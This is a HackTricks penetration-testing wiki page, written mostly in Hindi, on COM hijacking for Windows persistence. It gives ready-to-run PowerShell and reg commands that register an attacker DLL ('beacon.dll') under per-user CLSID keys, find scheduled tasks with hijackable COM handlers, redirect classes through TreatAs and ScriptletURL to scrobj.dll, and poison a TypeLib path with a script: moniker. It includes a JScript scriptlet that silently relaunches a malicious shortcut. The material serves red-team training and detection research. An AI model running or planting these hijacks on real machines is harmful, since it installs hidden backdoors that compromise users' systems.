# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### न-मौजूद COM components की खोज

चूँकि उपयोगकर्ता HKCU के मान बदल सकते हैं, इसलिए **COM Hijacking** को एक **persistence mechanism** के रूप में उपयोग किया जा सकता है। `procmon` का उपयोग करके उन COM रजिस्ट्रियों को ढूँढना आसान है जो अभी मौजूद नहीं हैं और जिन्हें एक आक्रमणकर्ता बना सकता है। क्लासिक फ़िल्टर:

- **RegOpenKey** ऑपरेशन्स।
- जहाँ _Result_ **NAME NOT FOUND** हो।
- और _Path_ **InprocServer32** पर समाप्त होता है।

तलाश के दौरान उपयोगी विविधताएँ:

- लापता **`LocalServer32`** keys भी देखें। कुछ COM क्लासेज out-of-process servers होते हैं और DLL की बजाय आक्रमणकर्ता-नियंत्रित EXE लॉन्च करेंगे।
- `InprocServer32` के अलावा रजिस्ट्री ऑपरेशन्स में **`TreatAs`** और **`ScriptletURL`** भी खोजें। Recent detection content और malware writeups इन्हें अक्सर इंगित करते हैं क्योंकि ये सामान्य COM registrations की तुलना में बहुत ज़्यादा दुर्लभ होते हैं और इसलिए high-signal होते हैं।
- HKCU में किसी registration को क्लोन करते समय मूल `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` से वैध **`ThreadingModel`** कॉपी करें। गलत मॉडल का उपयोग अक्सर activation तोड़ देता है और hijack को noisy बना देता है।
- 64-bit सिस्टमों पर 64-bit और 32-bit दोनों व्यूज़ (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` और `HKLM\Software\Classes\WOW6432Node`) की जाँच करें क्योंकि 32-bit applications अलग COM registration resolve कर सकती हैं।

एक बार जब आप निर्णय कर लें कि किस न-मौजूद COM का impersonate करना है, तो निम्न commands चलाएँ। _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### हाइजैक करने योग्य Task Scheduler COM कंपोनेंट्स

Windows Tasks Custom Triggers का उपयोग COM objects को कॉल करने के लिए करते हैं और क्योंकि ये Task Scheduler के माध्यम से निष्पादित होते हैं, इसलिए यह पूर्वानुमान करना आसान होता है कि ये कब ट्रिगर होंगे।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

आउटपुट की जाँच करके आप ऐसा चयन कर सकते हैं जिसे उदाहरण के लिए **हर बार जब कोई उपयोगकर्ता लॉगिन करता है** निष्पादित किया जाएगा।

अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** को **HKEY\CLASSES\ROOT\CLSID** में और HKLM तथा HKCU में खोजने पर, आम तौर पर आपको मिल जाएगा कि यह मान HKCU में मौजूद नहीं होता है।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
फिर, आप बस HKCU entry बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करेगा, आपका backdoor सक्रिय हो जाएगा।

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` एक CLSID को दूसरे द्वारा emulate करने की अनुमति देता है। आक्रामक दृष्टिकोण से इसका मतलब है कि आप मूल CLSID को अपरिवर्तित छोड़ सकते हैं, एक दूसरा per-user CLSID बना सकते हैं जो `scrobj.dll` की ओर इशारा करे, और फिर वास्तविक COM object को malicious वाले की ओर `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` के साथ redirect कर सकते हैं।

यह तब उपयोगी होता है जब:

- लक्षित एप्लिकेशन पहले ही लॉगऑन या ऐप स्टार्ट पर एक स्थिर CLSID instantiate कर देता है
- आप original `InprocServer32` को बदलने के बजाय केवल registry-आधारित redirect चाहते हैं
- आप `ScriptletURL` मान के माध्यम से local या remote `.sct` scriptlet execute करना चाहते हैं

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
नोट्स:

- `scrobj.dll` `ScriptletURL` मान पढ़ता है और संदर्भित `.sct` को निष्पादित करता है, इसलिए आप payload को लोकल फ़ाइल के रूप में रख सकते हैं या इसे HTTP/HTTPS के माध्यम से दूरस्थ रूप से प्राप्त कर सकते हैं।
- `TreatAs` विशेष रूप से उपयोगी होता है जब मूल COM रजिस्ट्रेशन HKLM में पूरा और स्थिर होता है, क्योंकि तब आपको पूरी tree की नकल करने के बजाय केवल एक छोटा per-user redirect चाहिए होता है।
- नेचुरल ट्रिगर का इंतजार किए बिना वैलिडेशन के लिए, आप fake ProgID/CLSID को मैन्युअली instantiate कर सकते हैं: `rundll32.exe -sta <ProgID-or-CLSID>` यदि target class STA activation को सपोर्ट करता है।

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM इंटरफेस को परिभाषित करती हैं और `LoadTypeLib()` के माध्यम से लोड होती हैं। जब कोई COM server instantiate होता है, OS संबंधित TypeLib को भी लोड कर सकता है, इसके लिए यह रजिस्ट्री keys को `HKCR\TypeLib\{LIBID}` के अंतर्गत चेक करता है। यदि TypeLib path को किसी **moniker** से बदल दिया जाए, जैसे `script:C:\...\evil.sct`, तो जब TypeLib resolve होगा Windows उस scriptlet को execute कर देगा — जिससे एक stealthy persistence मिलती है जो सामान्य components के उपयोग पर ट्रिगर होती है।

This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Steps (PowerShell)

1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) प्रति-उपयोगकर्ता TypeLib पथ को लोकल scriptlet की ओर निर्देशित करें `script:` moniker का उपयोग करके (no admin rights required):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) एक न्यूनतम JScript `.sct` डालें जो आपके प्राथमिक पेलोड को पुनः लॉन्च करे (उदा. प्रारंभिक चेन द्वारा उपयोग किया गया `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) ट्रिगरिंग – IE खोलना, कोई एप्लिकेशन जो WebBrowser control को embed करता है, या सामान्य Explorer गतिविधि भी TypeLib को लोड करेगी और scriptlet को निष्पादित करेगी, जिससे logon/reboot पर आपकी chain फिर से सक्रिय हो जाएगी।

सफाई
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
नोट्स
- आप उसी तर्क को अन्य उच्च-आवृत्ति COM components पर लागू कर सकते हैं; हमेशा सबसे पहले `HKCR\CLSID\{CLSID}\TypeLib` से वास्तविक `LIBID` निर्धारित करें।
- 64-bit सिस्टमों पर आप 64-bit consumers के लिए `win64` subkey भी populate कर सकते हैं।

## संदर्भ

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
